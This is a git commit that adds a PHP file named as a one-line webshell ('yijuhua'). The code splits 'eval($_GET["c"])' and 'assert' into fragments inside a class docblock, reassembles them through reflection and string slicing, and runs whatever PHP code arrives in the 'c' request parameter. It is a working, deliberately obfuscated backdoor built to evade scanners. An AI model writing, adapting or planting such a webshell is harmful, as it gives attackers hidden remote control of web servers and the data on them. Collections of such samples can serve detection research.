8b115799b9446f47e79cedff9fb8ee1e569035e7
root <root@localhost.localdomain>
2017-12-07 22:36:29 -0500

    add php yijuhua

---
+++ php/oneword_1.php
@@ -0,0 +1,17 @@
+<?php
+/**
+* eva
+* l($_GE
+* T["c"]);
+* asse
+* rt
+*/
+class TestClass { }
+$rc = new ReflectionClass('TestClass');
+$str = $rc->getDocComment();
+$evf=substr($str,strpos($str,'e'),3);
+$evf=$evf.substr($str,strpos($str,'l'),6);
+$evf=$evf.substr($str,strpos($str,'T'),8);
+$fu=substr($str,strpos($str,'as'),4);
+$fu=$fu.substr($str,strpos($str,'r'),2);
+$fu($evf);
